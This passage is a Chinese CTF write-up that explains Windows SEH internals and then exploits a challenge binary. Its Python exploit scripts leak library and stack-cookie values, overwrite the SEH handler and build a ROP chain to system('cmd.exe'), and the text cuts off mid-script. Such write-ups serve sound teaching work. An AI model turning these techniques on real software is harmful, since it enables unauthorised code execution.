+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__try &#123;</span><br><span class="line">    <span class="comment">/*可能产生异常的代码*/</span></span><br><span class="line">&#125; __except (<span class="comment">/*异常筛选代码*/</span> FilterFunction(GetExceptionCode(), GetExceptionInformation())) &#123;</span><br><span class="line">    <span class="comment">/*异常处理代码*/</span></span><br><span class="line">    ExceptionHandler();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__try &#123;</span><br><span class="line">    <span class="comment">/*可能产生异常的代码*/</span></span><br><span class="line">&#125; __finally &#123;</span><br><span class="line">    <span class="comment">/*终结处理代码*/</span></span><br><span class="line">    FinallyHandler();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><code>FilterFunction</code> 由用户定义用来筛选异常，返回值有如下三种：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Defined values for the exception filter expression</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXCEPTION_EXECUTE_HANDLER      1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXCEPTION_CONTINUE_SEARCH      0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EXCEPTION_CONTINUE_EXECUTION (-1)</span></span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>EXCPTION_EXECUTE_HANDLER</code>：表示该异常<strong>在预料之中</strong>，直接<strong>执行下面的 ExceptionHandler 。</strong></li>
+<li><code>EXCEPTION_CONTINUE_SEARCH</code>：表示<strong>不处理该异常</strong>，请继续寻找其他处理程序。</li>
+<li><code>EXCEPTION_CONTINUE_EXECUTION</code>：表示<strong>该异常已被修复</strong>，请回到异常现场再次执行。</li>
+</ul>
+<p><code>ExceptionHandler</code> 处理完异常后，需要返回如下返回值：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Exception disposition return values</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">EXCEPTION_DISPOSITION</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ExceptionContinueExecution, <span class="comment">//0</span></span><br><span class="line">    ExceptionContinueSearch,    <span class="comment">//1</span></span><br><span class="line">    ExceptionNestedException,   <span class="comment">//2</span></span><br><span class="line">    ExceptionCollidedUnwind     <span class="comment">//3</span></span><br><span class="line">&#125; EXCEPTION_DISPOSITION;</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>ExceptionContinueExecution</code>：表示<strong>异常已经被处理</strong>，程序可以继续执行。此时，程序会<strong>从发生异常的地址处继续执行</strong>，而不会跳转到异常处理程序中。</li>
+<li><code>ExceptionContinueSearch</code>：表示<strong>异常未被处理</strong>，程序应该<strong>继续搜索异常处理程序</strong>。当多个异常处理程序都可以处理同一个异常时，该枚举值可以用于指示程序继续搜索下一个异常处理程序。</li>
+<li><code>ExceptionNestedException</code>：表示<strong>在处理当前异常时</strong>，<strong>又发生了一个异常</strong>。此时，程序会跳转到新的异常处理程序中，处理新的异常。</li>
+<li><code>ExceptionCollidedUnwind</code>：表示<strong>发生了一些不可恢复的错误，无法继续执行当前线程</strong>。此时，线程的栈会被展开，<strong>所有的异常处理程序都会被调用</strong>，直到找到一个可以处理当前异常的异常处理程序。如果没有找到这样的异常处理程序，程序将终止。</li>
+</ul>
+<p>以下面这段代码为例（<a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/raw/master/windows_pwn/SEH_learning/SEH.exe" >SEH.exe <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，<a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/raw/master/windows_pwn/SEH_learning/SEH.pdb" >SEH.pdb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>）：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    __try &#123;</span><br><span class="line">        __try &#123;</span><br><span class="line">            __try &#123;</span><br><span class="line">                <span class="comment">// 可能会引发异常的代码</span></span><br><span class="line">                *(<span class="type">int</span> *) nullptr = <span class="number">1</span>;</span><br><span class="line">            &#125; __except (EXCEPTION_CONTINUE_SEARCH) &#123;</span><br><span class="line">                <span class="comment">// 处理异常</span></span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Handler 2&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; __except (EXCEPTION_EXECUTE_HANDLER) &#123;</span><br><span class="line">            <span class="comment">// 处理异常</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Handler 1&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        __try &#123;</span><br><span class="line">            <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">            x /= x;</span><br><span class="line">        &#125; __finally &#123;</span><br><span class="line">            <span class="comment">// 处理异常</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Handler 3&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; __except (EXCEPTION_CONTINUE_EXECUTION) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Handler 4&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>从 ida 中查看反汇编部分代码大致如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-17_11-15-09.png"
+                      alt="nipaste_2024-05-17_11-15-0"
+                ></p>
+<p>可以看到程序通过 <code>TryLevel</code> 更新为当前所在 <code>__try</code> 块的编号，这里给出 sky 针对这个程序画出相关结构图：<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-17_11-15-10.png"
+                      alt="nipaste_2024-05-17_11-15-1"
+                ></p>
+<p>这张图对比着前面的几个结构体来理解比较好（这张图对于<strong>理解后面的 SEH 利用非常重要</strong>）。</p>
+<blockquote>
+<p>处理函数使用 <strong>_except_handler4</strong> 作为代理函数<strong>来调用用户定义的处理函数</strong>。用户定义的 <strong>FilterFunc</strong> 和 <strong>HandlerFunc</strong> 保存在 <strong>SCOPETABLE</strong> 中（实际调试的 SCOPETABLE 可能是使用了 _EH3_SCOPETABLE_RECORD 因此和前面的 _EH4_SCOPETABLE_RECORD 定义有所不同）。</p>
+<p>通过分析汇编可知，MSC 对用户定义的 __try 块进行了编号，每个 __try 的编号为其在 SCOPETABLE 中对应的 SCOPETABLE_RECORD 的下标，对于不在 __try 块的情况编号为 -2（0xFFFFFE）。当代码执行到某个 __try 块中时，会先将栈中的 CPPEH_RECORD 的 TryLevel 更新为当前所在 __try 块的编号。另外， SCOPETABLE 中的 SCOPETABLE_RECORD 的 EnclosingLevel 记录了 __try 块外层包裹的 __try 块的编号，这样 _except_handler4 进行异常处理的时候就<strong>可以按正确的顺序调用处理函数</strong>。</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-17_11-25-42.png"
+                      alt="nipaste_2024-05-17_11-25-4"
+                ></p>
+<p>如该图中所示，在异常处理函数中还会<strong>用 old_esp 替换 esp 进一步完成栈回滚</strong>。（这里<strong>非常重要</strong>，如果有恢复 esp 为 old_esp 的操作则<strong>说明栈帧恢复到注册异常时的栈</strong>，异常处理函数<strong>准备直接跳转到发生异常的函数的结尾卸载 SEH 然后直接返回</strong>，此时 handler 的返回值即为异常函数的返回值，这种情况也<strong>对应着 __expect(…){…} 中没有调用用户定义的异常处理函数而是直接把代码写在 {…} 中而没有返回值的情况。</strong>否则说明 handler 在其所在的栈帧中分析处理异常，返回值为异常处理的结果。）</p>
+<p>触发异常后，<strong>输入 !exchain 可以查看 seh chain</strong>（有一种错误说法是 TryLevel 设为 0 后就可以用 !exchain 查看，实际上必须是触发异常后查看的 chain 才是 seh chain）</p>
+<p><strong>EXCEPTION_REGISTRATION 依次连接</strong>，最后一个 EXCEPTION_REGISTRATION 的 next 为 0xFFFFFFFF ，exceptionhandler 为 <code>ntdll!FinalExceptionHandler </code>。<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-17_11-30-47.png"
+                      alt="nipaste_2024-05-17_11-30-4"
+                ></p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="SEHOP"><a href="#SEHOP" class="headerlink" title="SEHOP"></a>SEHOP</h3><p>这道题比较简单，但是正是因为简单，我们才能够不受其他因素影响，更好的通过这道题去理解 SEH 异常处理机制。</p>
+<p><strong>检查保护</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-17_16-48-07.png"
+                      alt="nipaste_2024-05-17_16-48-0"
+                ></p>
+<p>开了 GS 保护，我们需要泄露 stack_cookie。</p>
+<p><strong>静态分析</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-17_16-51-39.png"
+                      alt="nipaste_2024-05-17_16-51-3"
+                ></p>
+<p>同样是<strong>存在栈溢出</strong>，而且里面存在貌似异常处理的代码，我们可以从汇编更能清晰看到程序异常处理步骤。<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-17_16-55-38.png"
+                      alt="nipaste_2024-05-17_16-55-3"
+                ></p>
+<p>可以看到正如前面异常机制中所说的那样，在进入 try 块的时候，程序会将 <strong>TryLevel 更新为当前 try 块的编号</strong>，用来在发生异常时定位异常处理程序。</p>
+<p><strong>动态分析</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-17_17-04-37.png"
+                      alt="nipaste_2024-05-17_17-04-3"
+                ></p>
+<p>首先通过简单调试可以发现，栈中存在一些 ucrtbased 库的地址，包括程序地址，我们可以进行栈溢出进行泄露，当然程序可能会崩溃，不过我们重启就好了，这些地址不会像 linux 那样被重新覆盖，只有机器重启了，这些地址才会发生变化。</p>
+<p><strong>step.1 leak ucrtbased addr &amp; step.2 leak code_base</strong></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step.1 leak ucrtbased addr</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10c</span></span><br><span class="line">sa(<span class="string">&quot;What is your name:&quot;</span>, payload)</span><br><span class="line">rl(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10c</span>)</span><br><span class="line">ucrtbased.address = u32(io.recv(<span class="number">4</span>)) - <span class="number">0x0afbd2</span></span><br><span class="line">li(<span class="string">&quot;ucrt_base&quot;</span>, ucrtbased.address)</span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># step.2 leak code_base</span></span><br><span class="line">io = process(file_name)</span><br><span class="line"><span class="comment"># windbgx.attach(io, &#x27;bp SEH + 0x154FA&#x27;)</span></span><br><span class="line">rl(<span class="string">&quot;This is the stack address : 0&quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">li(<span class="string">&quot;stack_addr&quot;</span>, stack_addr)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x114</span></span><br><span class="line">sa(<span class="string">&quot;What is your name:&quot;</span>, payload)</span><br><span class="line">rl(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x114</span>)</span><br><span class="line">pe.address = u32(io.recv(<span class="number">3</span>).ljust(<span class="number">4</span>, <span class="string">&#x27;\0&#x27;</span>)) - <span class="number">0x012120</span></span><br><span class="line">li(<span class="string">&quot;code_base&quot;</span>, pe.address)</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-17_17-07-20.png"
+                      alt="nipaste_2024-05-17_17-07-2"
+                ></p>
+<p><strong>step.3 attack SEH</strong></p>
+<p>这一步来到我们这一题的重点，首先思考我们再有了前面的两个地址之后，为什么不直接 ret2libc 呢，原因是还有一个 stackcookie，这个值程序每次启动时，都会重新发生变化，所以我们必须保证程序不崩溃的情况下，一次完成利用，这里就需要借助 SEH 这个好东西。</p>
+<p>我们再次回到前面的栈里，看看栈里面都有些什么东西</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-17_17-13-47.png"
+                      alt="nipaste_2024-05-17_17-13-4"
+                ></p>
+<p>这是我们在正常输入时栈里面的状态。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-17_17-15-26.png"
+                      alt="nipaste_2024-05-17_17-15-2"
+                ></p>
+<p>上图为 stack_cookie 所在的位置，我们如果破坏了它，会导致<code>__security_check_cookie(x)</code> 报错，导致不能正常 ROP。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-17_17-19-13.png"
+                      alt="nipaste_2024-05-17_17-19-1"
+                ></p>
+<p>还记的前面的那张图嘛，下图红框中的数据与我们上图中栈里的数据一一对应。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-17_17-20-24.png"
+                      alt="nipaste_2024-05-17_17-20-2"
+                ></p>
+<p>我们这里需要关注的是 <code>ExceptionHandler</code>，它的值为 <strong>00c62120</strong>，正常情况下它所指向的是 <code>__except_handler4</code> 异常处理句柄函数，当捕捉到异常时，首先会从栈里加载该地址，调用进行处理。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-17_17-25-13.png"
+                      alt="nipaste_2024-05-17_17-25-1"
+                ></p>
+<p>理所当然想到的是，如果我们这里将这个地址覆盖为其他地址，就可完成程序的执行流劫持，这也就是我们第三步所要做的事情。</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step.3 attack SEH</span></span><br><span class="line">io = process(file_name)</span><br><span class="line">main_addr = pe.address + <span class="number">0x15450</span></span><br><span class="line">li(<span class="string">&quot;main_addr&quot;</span>, main_addr)</span><br><span class="line"><span class="comment"># windbgx.attach(io, &quot;bp SEH + 0x154FA\nbp SEH + 0x15545&quot;)</span></span><br><span class="line"><span class="comment"># windbgx.attach(io, &#x27;bp SEH + 0x15588&#x27;)</span></span><br><span class="line">rl(<span class="string">&quot;This is the stack address : 0&quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">li(<span class="string">&quot;stack_addr&quot;</span>, stack_addr)</span><br><span class="line"><span class="comment"># create fake SEH handler</span></span><br><span class="line">payload = <span class="string">&#x27;\xcc&#x27;</span>*<span class="number">0x104</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) <span class="comment"># Stack_cookie</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) <span class="comment"># old_esp</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) <span class="comment"># exc_ptr</span></span><br><span class="line">payload += p32(stack_addr) <span class="comment"># next</span></span><br><span class="line">payload += p32(main_addr)  <span class="comment"># EXceptionHandler ==&gt; overwrite with our addr</span></span><br><span class="line">sa(<span class="string">&quot;What is your name:&quot;</span>, payload)</span><br><span class="line">sla(<span class="string">&quot;Give me one shot: &quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>我们将 EXceptionHandler 处的地址改为了 main 函数地址，使得在发生异常时，把 main 函数当做异常处理调用函数。</p>
+<p><strong>注意事项：</strong></p>
+<p>这里我们实际上是将 main 函数作为了 handler 函数，所以会发生重复调用，参考如下解释：</p>
+<blockquote>
+<p>如果我们把 Handler 从原本的 __except_handler4 覆盖为 main 函数，那么当触发异常时会把 main 函数当做 Handler 调用。</p>
+<p>再次进入 main 函数时，会在<strong>原来异常链上添加一个新的异常节点</strong>，该节点是正常的 __except_handler4 。如果此时触发异常会通过 __except_handler4 执行新注册的异常处理程序， 这个异常处理程序会输出 This is exception handler\n 然后返回 0 。由于 <strong>main 函数作为上一层 main 函数的 Handler 函数</strong>，这个返回值会被<strong>当做 Handler 函数返回了 ExceptionContinueExecution</strong> ，上一层的 main 函数认为异常以及被处理完，因此<strong>再次返回错误的位置执行</strong>，结果再次触发异常进入 main 函数。至此，我们实现了 main 函数的多次调用。</p>
+<p>source：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45323960/article/details/131697469" >https://blog.csdn.net/qq_45323960/article/details/131697469 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<p>上面的话稍微有点绕，但请读者一定要认真思考，才能对后面的理解更加深刻，这里 sky 师傅也画了张图来解释上面的调用</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-17_17-25-14.png"
+                      alt="nipaste_2024-05-17_17-25-1"
+                ></p>
+<p>因此程序总是会反复执行main函数，这将有利于我们泄露 stackcookie，并布置 ROP。</p>
+<p><strong>step.4 leak stack_cookie &amp; step.5 hijack control flow by rop dont trigger exceptionHandler</strong> </p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step.4 leak stack_cookie</span></span><br><span class="line"><span class="comment"># windbgx.attach(io, &quot;bp SEH + 0x154FA\nbp SEH + 0x15545&quot;)</span></span><br><span class="line">rl(<span class="string">&quot;This is the stack address : 0&quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">li(<span class="string">&quot;stack_addr&quot;</span>, stack_addr)</span><br><span class="line"><span class="comment"># create fake SEH handler</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span> + <span class="string">&#x27;\xcc&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">sa(<span class="string">&quot;What is your name:&quot;</span>, payload)</span><br><span class="line">rl(<span class="string">&quot;\xcc&quot;</span>*<span class="number">4</span>)</span><br><span class="line">stack_cookie = u32(re(<span class="number">4</span>))</span><br><span class="line">li(<span class="string">&quot;stack_cookie&quot;</span>, stack_cookie)</span><br><span class="line">sla(<span class="string">&quot;Give me one shot: &quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step.5 hijack control flow by rop dont trigger exceptionHandler</span></span><br><span class="line"><span class="comment"># windbgx.attach(io, &quot;bp SEH + 0x154FA\nbp SEH + 0x15545&quot;)</span></span><br><span class="line">rl(<span class="string">&quot;This is the stack address : 0&quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">li(<span class="string">&quot;stack_addr&quot;</span>, stack_addr)</span><br><span class="line"><span class="comment"># create fake SEH handler</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span> + <span class="string">&#x27;\xcc&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">payload += p32(stack_cookie) <span class="comment"># Stack_cookie</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) <span class="comment"># old_esp</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>) <span class="comment"># exc_ptr</span></span><br><span class="line">payload += p32(stack_addr) <span class="comment"># next</span></span><br><span class="line">payload += p32(main_addr)  <span class="comment"># EXceptionHandler ==&gt; overwrite with our addr</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)*<span class="number">2</span> + p32(stack_addr) </span><br><span class="line">payload += p32(ucrtbased.symbols[<span class="string">&#x27;system&#x27;</span>]) + p32(main_addr) + p32(ucrtbased.search(<span class="string">&quot;cmd.exe&quot;</span>).<span class="built_in">next</span>())</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;What is your name:&quot;</span>, payload)</span><br><span class="line">rl(<span class="string">&quot;\xcc&quot;</span>*<span class="number">4</span>)</span><br><span class="line">stack_cookie = u32(re(<span class="number">4</span>))</span><br><span class="line">li(<span class="string">&quot;stack_cookie&quot;</span>, stack_cookie)</span><br><span class="line">sla(<span class="string">&quot;Give me one shot: &quot;</span>, <span class="built_in">str</span>(stack_addr))</span><br></pre></td></tr></table></figure></div>
+
+<p>这一步利用较为简单，可以尝试自己看代码进行理解。</p>
+<p>最后效果如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-05-17_17-37-03.png"
+                      alt="nipaste_2024-05-17_17-37-0"
+                ></p>
+<p><strong>exp</strong></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#--------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">re = <span class="keyword">lambda</span> data: io.recv(data)</span><br><span class="line">sd = <span class="keyword">lambda</span> data: io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data: io.sendline(data)</span><br><span class="line">rl = <span class="keyword">lambda</span> data: io.recvuntil(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> content, data: (io.recvuntil(content), io.send(data))</span><br><span class="line">sla = <span class="keyword">lambda</span> content, data: (io.recvuntil(content), io.sendline(data))</span><br><span class="line">li = <span class="keyword">lambda</span> content, data: sys.stdout.write(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + content + <span class="string">&#x27; == &#x27;</span> + <span class="built_in">hex</span>(data) + <span class="string">&#x27;\x1b[0m\n&#x27;</span>)</span><br><span class="line">ucrtbased = winfile(<span class="string">&quot;ucrtbased.dll&quot;</span>)</span><br><span class="line"><span class="comment"># kernel32 = winfile(&quot;C:/Windows/SYSTEM32/kernel32.dll&quot;)</span></span><br><span class="line"><span class="comment"># kernel32 = winfile(&quot;C:/Windows/SysWOW64/kernel32.dll&quot;)</span></span><br><span class="line"><span class="comment"># ntdll = winfile(&quot;C:/Windows/SYSTEM32/ntdll.dll&quot;)</span></span><br><span class="line">file_name = <span class="string">&#x27;./SEH.exe&#x27;</span></span><br><span class="line">pe = winfile(file_name, rebase = <span class="literal">True</span>)</span><br><span class="line">io = process(file_name)</span><br><span class="line"><span class="comment"># io = remote()</span></span><br><span class="line"><span class="comment">#--------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># windbgx.attach(io, &#x27;bp SEH + 0x154FA&#x27;)</span></span><br><span class="line">rl(<span class="string">&quot;This is the stack address : 0&quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">li(<span class="string">&quot;stack_addr&quot;</span>, stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step.1 leak ucrtbased addr</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10c</span></span><br><span class="line">sa(<span class="string">&quot;What is your name:&quot;</span>, payload)</span><br><span class="line">rl(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10c</span>)</span><br><span class="line">ucrtbased.address = u32(io.recv(<span class="number">4</span>)) - <span class="number">0x0afbd2</span></span><br><span class="line">li(<span class="string">&quot;ucrt_base&quot;</span>, ucrtbased.address)</span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># step.2 